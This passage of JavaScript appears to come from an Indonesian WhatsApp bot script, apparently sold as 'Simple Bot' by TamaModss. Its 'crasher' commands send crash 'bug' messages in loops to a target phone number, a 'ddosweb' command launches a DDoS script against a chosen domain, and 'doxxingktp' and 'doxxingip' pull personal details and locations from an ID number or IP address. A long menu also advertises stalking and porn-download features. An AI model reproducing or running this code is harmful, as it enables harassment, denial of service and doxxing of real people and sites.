 const REPO_NAME = 'Security'; // Ganti dengan nama repositori Anda
 const FILE_PATH = 'RyuzenV13.json'; // Path ke file JSON di repositori Anda

 try {
   // Ambil data JSON dari GitHub
   const response = await fetch(`https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/main/${FILE_PATH}`);
   const jsonData = await response.json();

   // Validasi apakah data sudah ada
   if (!jsonData || !jsonData.DataNomors || !Array.isArray(jsonData.DataNomors)) {
     return reply('❌ Struktur data tidak valid.');
   }

   // Cek apakah nomor sudah ada di database
   if (jsonData.DataNomors.includes(phoneNumber)) {
     return reply(`❌ Nomor ${phoneNumber} sudah ada di database.`);
   }

   // Tambahkan nomor baru ke array data
   jsonData.DataNomors.push(phoneNumber); // Nomor ditambahkan di akhir array

   // Encode data JSON menjadi base64 untuk diupload ke GitHub
   const updatedData = JSON.stringify(jsonData, null, 2); // Format JSON dengan indentation 2 spasi
   const base64Content = Buffer.from(updatedData).toString('base64'); // Encode ke base64

   // Ambil SHA dari file GitHub yang ada
   const shaResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`);
   const shaData = await shaResponse.json();
   const currentSHA = shaData.sha; // SHA file yang ada

   // Update file di GitHub
   const updateResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
     method: 'PUT',
     headers: {
       'Authorization': `Bearer ${GITHUB_TOKEN}`,
       'Content-Type': 'application/json',
     },
     body: JSON.stringify({
       message: `Menambahkan nomor ${phoneNumber} ke database`,
       content: base64Content,
       sha: currentSHA, // SHA file yang ada
     }),
   });

   const updateResult = await updateResponse.json();

   if (updateResponse.status === 200) {
     return reply(`✅ Nomor ${phoneNumber} berhasil ditambahkan ke database.`);
   } else {
     throw new Error(`Error menambahkan nomor: ${updateResult.message}`);
   }
 } catch (error) {
   console.error(error);
   return reply(`❌ Error: ${error.message}`);
 }
}
break;
        
case 'force-ori': {
try {
if (!isCreator && !isPremium) return ReplyButton(mess.premium);
if (!q) return kontolreply(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
 mentionedJid = m.mentionedJid[0];
} else {
 let jidx = q.replace(/[^0-9]/g, "");
 if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
 mentionedJid = `${jidx}@s.whatsapp.net`;
 lockNum = `${jidx}`;
}

let target = mentionedJid;
let lock = lockNum;
let teks = `—(Simple Bot Notification)
☇ Lock : *${lock}*
☇ Meth : *${command}*

𝐓𝐚𝐦𝐚 ☇ 𝐌𝐨𝐝𝐬𝐬`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 30; i++) {
console.log(chalk.green(`succes send bugs`));
await xcloseapps(client, target);
await Fc(client, target);
await xcloseapps(client, target);
await Fc(client, target);
await IOSV1(client, target);
await IOSV2(client, target);
await ui(client, target);
}
////////// Succes Bugs //////////
} catch (err) {
console.error(err);
kontolreply("Failed to send virus. Make sure the number is valid.");
}
}
break;
case 'force-bisnis': {
try {
if (!isCreator && !isPremium) return ReplyButton(mess.premium);
if (!q) return kontolreply(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
 mentionedJid = m.mentionedJid[0];
} else {
 let jidx = q.replace(/[^0-9]/g, "");
 if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
 mentionedJid = `${jidx}@s.whatsapp.net`;
 lockNum = `${jidx}`;
}

let target = mentionedJid;
let lock = lockNum;
let teks = `—(Simple Bot Notification)
☇ Lock : *${lock}*
☇ Meth : *${command}*

𝐓𝐚𝐦𝐚 ☇ 𝐌𝐨𝐝𝐬𝐬`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 30; i++) {
console.log(chalk.green(`succes send bug to target : ${target}`));
await xcloseapps(client, target);
await ui(client, target);
await Fc(client, target);
await IOSV1(client, target);
await IOSV2(client, target);
}
////////// Succes Bugs //////////
} catch (err) {
console.error(err);
kontolreply("Failed to send virus. Make sure the number is valid.");
}
}
break;
case 'delay-loca': {
try {
if (!isCreator && !isPremium) return ReplyButton(mess.premium);
if (!q) return kontolreply(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
 mentionedJid = m.mentionedJid[0];
} else {
 let jidx = q.replace(/[^0-9]/g, "");
 if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
 mentionedJid = `${jidx}@s.whatsapp.net`;
 lockNum = `${jidx}`;
}

let target = mentionedJid;
let lock = lockNum;
let teks = `—(Simple Bot Notification)
☇ Lock : *${lock}*
☇ Meth : *${command}*

𝐓𝐚𝐦𝐚 ☇ 𝐌𝐨𝐝𝐬𝐬`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 30; i++) {
console.log(chalk.green(`succes send bug to target : ${target}`));
await LocaX(target);
await LocaX(target);
await LocaX(target);
}
////////// Succes Bugs //////////
} catch (err) {
console.error(err);
kontolreply("Failed to send virus. Make sure the number is valid.");
}
}
break;
case 'hades': {
try {
if (!isCreator && !isPremium) return ReplyButton(mess.premium);
if (!q) return kontolreply(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
 mentionedJid = m.mentionedJid[0];
} else {
 let jidx = q.replace(/[^0-9]/g, "");
 if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
 mentionedJid = `${jidx}@s.whatsapp.net`;
 lockNum = `${jidx}`;
}

let target = mentionedJid;
let lock = lockNum;
let teks = `—(Simple Bot Notification)
☇ Lock : *${lock}*
☇ Meth : *${command}*

𝐓𝐚𝐦𝐚 ☇ 𝐌𝐨𝐝𝐬𝐬`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 30; i++) {
console.log(chalk.green(`succes send bug to target : ${target}`));
await xcloseapps(client, target);
await ui(client, target);
await ui(client, target);
await ui(client, target);
await ui(client, target);
await Fc(client, target);
}
////////// Succes Bugs //////////
} catch (err) {
console.error(err);
kontolreply("Failed to send virus. Make sure the number is valid.");
}
}
break;
case 'delay-mention': {
try {
if (!isCreator && !isPremium) return ReplyButton(mess.premium);
if (!q) return kontolreply(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
 mentionedJid = m.mentionedJid[0];
} else {
 let jidx = q.replace(/[^0-9]/g, "");
 if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
 mentionedJid = `${jidx}@s.whatsapp.net`;
 lockNum = `${jidx}`;
}

let target = mentionedJid;
let lock = lockNum;
let teks = `—(Simple Bot Notification)
☇ Lock : *${lock}*
☇ Meth : *${command}*

𝐓𝐚𝐦𝐚 ☇ 𝐌𝐨𝐝𝐬𝐬`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 30; i++) {
console.log(chalk.green(`succes send bug to target : ${target}`));
await SuckIns(client, target);
await LocaX(target);
await SuckIns(client, target);
await LocaX(target);
await ui(client, target);
}
////////// Succes Bugs //////////
} catch (err) {
console.error(err);
kontolreply("Failed to send virus. Make sure the number is valid.");
}
}
break;
case 'crash-ios': {
try {
if (!isCreator && !isPremium) return ReplyButton(mess.premium);
if (!q) return kontolreply(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
 mentionedJid = m.mentionedJid[0];
} else {
 let jidx = q.replace(/[^0-9]/g, "");
 if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
 mentionedJid = `${jidx}@s.whatsapp.net`;
 lockNum = `${jidx}`;
}

let target = mentionedJid;
let lock = lockNum;
let teks = `—(Simple Bot Notification)
☇ Lock : *${lock}*
☇ Meth : *${command}*

𝐓𝐚𝐦𝐚 ☇ 𝐌𝐨𝐝𝐬𝐬`
ReplyButton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 30; i++) {
console.log(chalk.green(`succes send bug to target : ${target}`));
await xcloseapps(client, target);
await Fc(client, target);
await IOSV1(client, target);
await IOSV2(client, target);
await IOSV1(client, target);
await IOSV2(client, target);
}
////////// Succes Bugs //////////
} catch (err) {
console.error(err);
kontolreply("Failed to send virus. Make sure the number is valid.");
}
}
break;

case "doxxingktp": {
    if (!isOwner) return reply(mess.owner);
    if (!q) return reply(example("masukkan NIK target"));

    try {
        const { nikParser } = require('nik-parser');
        const nik = nikParser(q);

        if (!nik.isValid()) {
            return reply("⚠️ NIK tidak valid. Harap periksa kembali.");
        }

        const provinsi = nik.province();
        const kabupaten = nik.kabupatenKota();
        const kecamatan = nik.kecamatan();

        const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(kecamatan + ', ' + kabupaten + ', ' + provinsi)}`;

        reply(`✅ *Informasi NIK:*\n
- *Provinsi:* ${provinsi} (ID: ${nik.provinceId()})
- *Kabupaten/Kota:* ${kabupaten} (ID: ${nik.kabupatenKotaId()})
- *Kecamatan:* ${kecamatan} (ID: ${nik.kecamatanId()})
- *Kode Pos:* ${nik.kodepos()}
- *Jenis Kelamin:* ${nik.kelamin()}
- *Tanggal Lahir:* ${nik.lahir()}
- *Uniqcode:* ${nik.uniqcode()}

📍 *Lokasi di Maps:* [Klik Disini](${mapsUrl})`);

    } catch (error) {
        console.error("Error saat parsing NIK:", error);
        reply("⚠️ Terjadi kesalahan saat memproses NIK.");
    }

    break;
}
case "doxxingip": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply(example("112.90.150.204"));

    try {
        let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

        if (!res?.success) {
            throw new Error(`⚠️ IP ${text} tidak ditemukan atau tidak valid!`);
        }

        const formatIPInfo = (info) => {
            return `
*🌍 Informasi IP:*
• *IP:* ${info.ip || 'N/A'}
• *Tipe:* ${info.type || 'N/A'}
• *Benua:* ${info.continent || 'N/A'} (${info.continent_code || 'N/A'})
• *Negara:* ${info.country || 'N/A'} (${info.country_code || 'N/A'})
• *Provinsi:* ${info.region || 'N/A'} (${info.region_code || 'N/A'})
• *Kota:* ${info.city || 'N/A'}
• *Kode Pos:* ${info.postal || 'N/A'}
• *Kode Telepon:* ${info.calling_code || 'N/A'}
• *Ibu Kota:* ${info.capital || 'N/A'}
• *Perbatasan:* ${info.borders || 'N/A'}

*🚩 Bendera:* ${info.flag?.emoji || 'N/A'}
• *Organisasi:* ${info.connection?.org || 'N/A'}
• *ISP:* ${info.connection?.isp || 'N/A'}
• *Domain:* ${info.connection?.domain || 'N/A'}

*🕰️ Zona Waktu:*
• *ID:* ${info.timezone?.id || 'N/A'}
• *Abbr:* ${info.timezone?.abbr || 'N/A'}
• *DST:* ${info.timezone?.is_dst ? 'Yes' : 'No'}
• *UTC:* ${info.timezone?.utc || 'N/A'}
• *Waktu Sekarang:* ${info.timezone?.current_time || 'N/A'}

📍 *Lokasi Maps:* [Klik Disini](https://www.google.com/maps?q=${info.latitude},${info.longitude})
            `;
        };

        // Kirim lokasi jika tersedia
        if (res.latitude && res.longitude) {
            await client.sendMessage(m.chat, { 
                location: { 
                    degreesLatitude: res.latitude, 
                    degreesLongitude: res.longitude 
                } 
            }, { ephemeralExpiration: 604800 });

            // Delay 2 detik sebelum mengirim detail IP agar tidak tabrakan
            await new Promise(resolve => setTimeout(resolve, 2000));
        }

        reply(formatIPInfo(res));

    } catch (e) { 
        console.error("Error saat mengambil data IP:", e);
        reply(`⚠️ Error: Tidak dapat mengambil data untuk IP ${text}`);
    }

    break;
}
case "ddosweb": {
    if (!isOwner) return reply(mess.owner);
    if (!q || !q.includes(" ")) return reply(example("domain.com 60"));

    let [targetweb, timeweb] = q.split(" ");

    if (!targetweb || !timeweb || isNaN(timeweb)) {
        return reply(example("domain.com 60"));
    }

    reply(`🚀 *Bot sedang menyerang! Tunggu hasilnya...*\n• *Target:* ${targetweb}\n• *Waktu Serangan:* ${timeweb} detik`);

    const { exec } = require("child_process");
    exec(
        `node ./storage/ddos.js ${targetweb} ${timeweb}`,
        { maxBuffer: 1024 * 1024 },
        (error, stdout, stderr) => {
            if (error) {
                console.error("❌ Error:", error);
                return reply(`⚠️ Terjadi kesalahan: ${error.message}`);
            }
            if (stderr) {
                console.error("❌ Stderr:", stderr);
                return reply(`⚠️ Terjadi kesalahan: ${stderr}`);
            }

            reply(`✅ *Serangan Selesai!*\n\n• *Target:* ${targetweb}\n• *Durasi:* ${timeweb} detik`);
        }
    );

    break;
}

case "allmenu": case "buttonnew": {
  client.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
  client.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
let teks = `Здравствуйте, у меня есть Simple Bot, созданный TamaModss для многофункциональных устройств. 

╔─═⊱ *「 𝐓𝐀𝐌𝐀 𝐌𝐎𝐃𝐒𝐒 」* ─═⬣
║友 ɴᴀᴍᴇ ʙᴏᴛ : Simple Bot
║友 ᴠᴇʀsɪᴏɴ : 1.0 GEN 2
║友 ᴛᴇʟᴇɢʀᴀᴍ ᴅᴇᴠᴇʟᴏᴘᴇʀ  : t.me/TamaModss
║友 ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}
║友 ɪɴғᴏʀᴍᴀᴛɪᴏɴ : t.me/TamaModss 
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`DATABASE\` 」* ─═⬣
║┏⊱
║⿻ adddb
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`CRASHER\` 」* ─═⬣
║┏⊱
║⿻ force-bisnis
║⿻ delay-loca
║⿻ hades
║⿻ delay-mention
║⿻ crash-ios
║⿻ force-ori
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`SALURAN\` 」* ─═⬣
║┏⊱
║⿻ cekidch
║⿻ addidch
║⿻ delidch
║⿻ listidch
║⿻ jpmallch
║⿻ jpmallch2
║⿻ joinch
║⿻ reactch
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`CLOUDFLARE\` 」* ─═⬣
║┏⊱
║⿻ adddomaincf
║⿻ deldomaincf
║⿻ listdomaincf
║⿻ clearallsubdo
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`FITUR NEW\` 」* ─═⬣
║┏⊱
║⿻ createweb
║⿻ delweb
║⿻ ambilkodeweb
║⿻ listweb
║⿻ createsc
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`OTHER\` 」* ─═⬣
║┏⊱
║⿻ cekidgc
║⿻ rvo
║⿻ qc
║⿻ brat
║⿻ bratvideo
║⿻ bratanime
║⿻ emojimix
║⿻ emojigif
║⿻ stickerwm
║⿻ sticker
║⿻ infocrypto
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`STALKER\` 」* ─═⬣
║┏⊱
║⿻ ffstalk
║⿻ mlstalk
║⿻ igstalk
║⿻ tiktokstalk
║⿻ githubstalk
║⿻ ytstalk
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`PRODUK\` 」* ─═⬣
║┏⊱
║⿻ addproduk
║⿻ delproduk
║⿻ checkproduk
║⿻ editproduk
║⿻ listproduk
║⿻ buyproduk
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`SCRIPT\` 」* ─═⬣
║┏⊱
║⿻ addscript
║⿻ delscript
║⿻ listscript
║⿻ infoscript
║⿻ belistockscript
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`STOCK\` 」* ─═⬣
║┏⊱
║⿻ addstokdo
║⿻ delstokdo
║⿻ liststokdo
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`CATATAN\` 」* ─═⬣
║┏⊱
║⿻ addpendapatan
║⿻ delpendapatan
║⿻ listpendapatan
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`SEARCH\` 」* ─═⬣
║┏⊱
║⿻ nsfw
║⿻ hentaineko
║⿻ hentaivideo
║⿻ r34
║⿻ yts
║⿻ apkmod
║⿻ pinterest
║⿻ sfile
║⿻ gimage
║⿻ xnxx
║⿻ playstore
║⿻ npmsearch
║⿻ tiktokstalk
║⿻ igstalk
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`ORKUT H2H\` 」* ─═⬣
║┏⊱
║⿻ cekstatus
║⿻ ceksaldo-orkut
║⿻ cekmutasi
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`FUN\` 」* ─═⬣
│┏⊱
║⿻ confess
║⿻ balasmenfess
║⿻ tolakmenfess
║⿻ stopmenfess
║⿻ bekerja
║⿻ sound1 - sound161
║⿻ mangkane1 - mangkane54 ( sound )
║⿻ acumalaka ( sound )
║⿻ reza-kecap ( sound )
║⿻ farhan-kebab ( sound )
║⿻ omaga ( sound )
║⿻ kamu-nanya ( sound )
║⿻ anjay ( sound )
║⿻ siuu ( sound )
║⿻ jodoh
║⿻ emojimix
║⿻ emojigif
║⿻ cekkhodam
║⿻ cekganteng
║⿻ cekcantik
║⿻ kapankah
║⿻ ceksange
║⿻ cekkontol
║⿻ cekmemek
║⿻ cekjomok
║⿻ tambah
║⿻ kurang
║⿻ kali
║⿻ bagi
║⿻ paptt1
║⿻ paptt2
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`ISLAMI\` 」* ─═⬣
║┏⊱
║⿻ kisahnabi
║⿻ quotesislami
║⿻ bacaansholat
║⿻ asmaulhusna
║⿻ ayatkursi
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`TOOLSS\` 」* ─═⬣
│┏⊱
║⿻ autoai
║⿻ ai
║⿻ ai-islam
║⿻ ai-inggris
║⿻ gpt
║⿻ deepseek
║⿻ tourl
║⿻ tourlvid
║⿻ ssweb
║⿻ translate
║⿻ hd
║⿻ shortlink
║⿻ ocr
║⿻ nulis
║⿻ removebg
║⿻ readqr
║⿻ enc
║⿻ enchard
║⿻ encmed
║⿻ doxxingktp
║⿻ doxxingip
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`SHOP\` 」* ─═⬣
│┏⊱
║⿻ buypanel
║⿻ buyadp
║⿻ buyscript
║⿻ buyvps
║⿻ buyresellerpanel
║⿻ buyownpanel
║⿻ buyptpanel
║⿻ jasainstallpanel
║⿻ jasahbpanel
║⿻ jasainstalltema
║⿻ jasainstalltemaelysium
║⿻ jasainstalltemabilling
║⿻ jasainstalltemaenigma
║⿻ jasainstalltemanightcore
║⿻ buyjasashare
║⿻ buydigitalocean
║⿻ buyfitur
║⿻ qris
║⿻ dana
║⿻ gopay
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣  

╔─═⊱ *「 \`DOWNLOAD\` 」* ─═⬣
│┏⊱
║⿻ tiktok
║⿻ tiktokmp3
║⿻ facebook
║⿻ instagram
║⿻ ytmp3
║⿻ ytmp4
║⿻ play
║⿻ playvideo
║⿻ videy
║⿻ bokep
║⿻ pornhub
║⿻ gitclone
║⿻ mediafire
║⿻ capcut
║⿻ doodstream
║⿻ playspotify
║⿻ googledrive
║⿻ spotify
║⿻ terabox
║⿻ xnxxdl
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`STORE\` 」* ─═⬣
│┏⊱
║⿻ addrespon
║⿻ delrespon
║⿻ listrespon
║⿻ done
║⿻ proses
║⿻ jpm
║⿻ jpm2
║⿻ playvideo
║⿻ jpmchfoto
║⿻ jpmallch
║⿻ jpmallch2 <memakai waktu>
║⿻ jpmtesti
║⿻ jpmslide
║⿻ jpmslideht
║⿻ sendtesti
║⿻ pushkontak
║⿻ pushkontak1
║⿻ pushkontak2
║⿻ savekontak
║⿻ savekontak2
║⿻ payment
║⿻ produk
║⿻ subdomain
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`DIGITAL OCEAN\` 」* ─═⬣
│┏⊱
║⿻ cvps
║⿻ createvps
║⿻ gantipwvps
║⿻ changeapido
║⿻ checkdo
║⿻ turnon
║⿻ turnoff
║⿻ sisadroplet
║⿻ deldroplet
║⿻ listdroplet
║⿻ rebuild
║⿻ restartvps
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`PANEL\` 」* ─═⬣
│┏⊱
║⿻ addseller
║⿻ delseller
║⿻ listseller
║⿻ addserverpanel
║⿻ delserverpanel
║⿻ listserverpanel
║⿻ addaksesgrub
║⿻ delaksesgrub
║⿻ listaksesgrub
║⿻ 1gb - unlimited
║⿻ c1gb - cunli
║⿻ cadmin1
║⿻ cpanel
║⿻ delpanelall
║⿻ deluserall
║⿻ clearall
║⿻ deladminall
║⿻ cadmin
║⿻ delpanel
║⿻ deladmin
║⿻ listpanel
║⿻ listadmin
║⿻ linklog
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`PANEL V2\` 」* ─═⬣
│┏⊱
║⿻ addseller-v2
║⿻ delseller-v2
║⿻ listseller-v2
║⿻ 1gb-v2 - unlimited-v2
║⿻ c1gb-v2 - cunli-v2
║⿻ cadmin1-v2
║⿻ cpanel-v2
║⿻ delpanelall-v2
║⿻ deluserall-v2
║⿻ clearall-v2
║⿻ deladminall-v2
║⿻ cadmin-v2
║⿻ delpanel-v2
║⿻ deladmin-v2
║⿻ listpanel-v2
║⿻ listadmin-v2
║⿻ linklog-v2
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`INSTALLER\` 」* ─═⬣
│┏⊱
║⿻ hackbackpanel
║⿻ hackbackpanel2
║⿻ installpanel
║⿻ installpanel2
║⿻ startwings
║⿻ installthema
║⿻ installtemastellar
║⿻ installtemanebula
║⿻ installtemanightcore
║⿻ installtemabilling
║⿻ installtemaenigma
║⿻ uninstallpanel
║⿻ uninstalltema
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣

╔─═⊱ *「 \`GROUP\` 」* ─═⬣
│┏⊱
║⿻ add
║⿻ antilink
║⿻ antilink2
║⿻ antilinkall
║⿻ antitoxic
║⿻ antilinkwa
║⿻ antitoxic
║⿻ mute
║⿻ blacklistjpm
║⿻ welcome
║⿻ invite
║⿻ kick
║⿻ kicktime
║⿻ gcsider
║⿻ creategc
║⿻ close
║⿻ closetime
║⿻ opentime
║⿻ open
║⿻ hidetag
║⿻ spamtag
║⿻ kudetagc
║⿻ kudetagc2
║⿻ promoteall
║⿻ demoteall
║⿻ promote
║⿻ demote
║⿻ resetlinkgc
║⿻ on
║⿻ off
║⿻ linkgc
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣  

╔─═⊱ *「 \`OWNER CMD\` 」* ─═⬣
│┏⊱
║⿻ autoread
║⿻ adddomain
║⿻ deldomain
║⿻ listdomain
║⿻ blokir
║⿻ unblokir
║⿻ layanan
║⿻ tagsw
║⿻ upswtag
║⿻ cekdns
║⿻ cekhost
║⿻ cekip
║⿻ trackip
║⿻ cekweb
║⿻ ceksubdo
║⿻ sendngl
║⿻ otomatisauto
║⿻ cekinfo
║⿻ autopromosi
║⿻ autoreadsw
║⿻ autotyping
║⿻ addcase
║⿻ delcase
║⿻ getcase
║⿻ getcase2
║⿻ listcase
║⿻ renamecase
║⿻ addfunction
║⿻ delfunction
║⿻ addowner
║⿻ delowner
║⿻ listowner
║⿻ addprem
║⿻ delprem
║⿻ listprem
║⿻ self/public
║⿻ settppbot
║⿻ clearsession
║⿻ clearchat
║⿻ restartbot
║⿻ getip
║⿻ daftarsc
║⿻ hapussc
║⿻ svsc
║⿻ sendsc
║⿻ getfile
║⿻ listgc
║⿻ info
║⿻ script
║⿻ runtime
║⿻ joingc
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`
await client.sendMessage(m.chat, {
  footer: `${footer}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐓͢𝗮𝗺𝗮`𝐓͢𝐢𝐳𝐢͢𝐢',
          sections: [
            {
              title: '𝑪𝒉𝒐𝒐𝒔𝒆 ( 📑 ) 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔 𝑩𝒆𝒍𝒐𝒘',
              highlight_label: '𐁘',
              rows: [
                                {
                                    title: "𝗢𝗿𝗱𝗲𝗿 𝗞𝘂𝗼𝘁𝗮 𝗛𝟮𝗛",
                                    description: "Fitur Orkut",
                                    id: ".orkut"
                                },
                                {
                                    title: "𝗣𝗿𝗼𝗱𝘂𝗸 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Produk",
                                    id: ".produkmenu"
                                },
                                {
                                    title: "𝗦𝘁𝗼𝗰𝗸 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Stock",
                                    id: ".stokmenu"
                                },
                                {
                                    title: "𝗦𝘁𝗮𝗹𝗸𝗲𝗿 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Stalking",
                                    id: ".stalkmenu"
                                },
                                {
                                    title: "𝗖𝗮𝘁𝗮𝘁𝗮𝗻 𝗠𝗲𝗻𝘂",
                                    description: "Catatan Kebutuhan",
                                    id: ".catatanmenu"
                                },
                                {
                                    title: "𝗖𝗿𝗮𝘀𝗵 𝗦𝘆𝘀𝘁𝗲𝗺",
                                    description: "Bug Menu",
                                    id: ".attackmenu"
                                },
                                {
                                    title: "𝗖𝗹𝗼𝘂𝗱𝗳𝗹𝗮𝗿𝗲 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Domain Cf",
                                    id: ".cfmenu"
                                },
                                {
                                    title: "𝗦𝗮𝗹𝘂𝗿𝗮𝗻 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Channel",
                                    id: ".saluranmenu"
                                },
                                {
                                    title: "𝗜𝘀𝗹𝗮𝗺𝗶 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Muslim",
                                    id: ".islammenu"
                                },
                                {
                                    title: "𝗦𝗰𝗿𝗶𝗽𝘁 𝗠𝗲𝗻𝘂",
                                    description: "Sc Stock",
                                    id: ".scmenu"
                                },
                                {
                                    title: "𝗙𝘂𝗻 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Sc MD",
                                    id: ".funmenu"
                                },
                                {
                                    title: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼",
                                    description: "Terima Kasih Kepada Penyupport Script ini",
                                    id: ".tqto"
                                },
                                {
                                    title: "𝗢𝘁𝗵𝗲𝗿 𝗠𝗲𝗻𝘂",
                                    description: "Menu Other",
                                    id: ".othermenu"
                                },
                                {
                                    title: "𝗦𝗲𝗮𝗿𝗰𝗵 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Menelusuri",
                                    id: ".searchmenu"
                                },
                                {
                                    title: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Peralatan",
                                    id: ".toolsmenu"
                                },
                                {
                                    title: "𝗦𝗵𝗼𝗽 𝗠𝗲𝗻𝘂",
                                    description: "Pembelian Otomatis",
                                    id: ".shopmenu"
                                },
                                {
                                    title: "𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Download",
                                    id: ".downloadmenu"
                                },
                                {
                                    title: "𝗦𝘁𝗼𝗿𝗲 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Store & Push Kontak & Jpm",
                                    id: ".storemenu"
                                },
                                {
                                    title: "𝗗𝗶𝗴𝗶𝘁𝗮𝗹 𝗢𝗰𝗲𝗮𝗻 𝗠𝗲𝗻𝘂",
                                    description: "Control Digital Ocean",
                                    id: ".domenu"
                                },
                                {
                                    title: "𝗣𝗮𝗻𝗲𝗹 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Panel",
                                    id: ".panelmenu"
                                },
                                {
                                    title: "𝗹𝗻𝘀𝘁𝗮𝗹𝗹𝗲𝗿 𝗠𝗲𝗻𝘂",
                                    description: "Fitur install",
                                    id: ".installmenu"
                                },
                                {
                                    title: "𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Group",
                                    id: ".grubmenu"
                                },
                                {
                                    title: "𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂",
                                    description: "Fitur Owner",
                                    id: ".ownermenu"
                                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: fs.readFileSync("./source/media/Xyz.jpg"), 
  caption: `${teks}`,
  contextInfo: {
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namasaluran
   }
  },
}, {quoted: loli})
}
break;

case 'islammenu':{
const teks12 = `╔─═⊱ *「 \`ISLAMI\` 」* ─═⬣
║┏⊱
║⿻ kisahnabi
║⿻ quotesislami
║⿻ bacaansholat
║⿻ asmaulhusna
║⿻ ayatkursi
║┗⊱
┗━━━━━━━━━━━━━━━━━⬣`;
client.sendMessage(m.chat, {
video: { url: `https://files.catbox.moe/5l5mpz.mp4` },
gifPlayback: true,
caption: teks12,
footer: "SELECT THE MENU BELOW TO USE||以下のメニューを選択して使用してください||아래 메뉴를 선택하여 사용하세요",
buttons: [
{
buttonId: '.tqto',
buttonText: {
displayText: 'Thanks To'
},
type: 1,
},
{
buttonId: 'action',
buttonText: {
displayText: "Tama Modss"
},
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Simple Bot V11',
sections: [
{
title: 'T-Simple Bot',
highlight_label: `Powered By Tama Modss`,
rows: [
{
header: 'Owner Cmd',
title: 'Owner Menu',
description: 'Tampilkan Menu Owner',
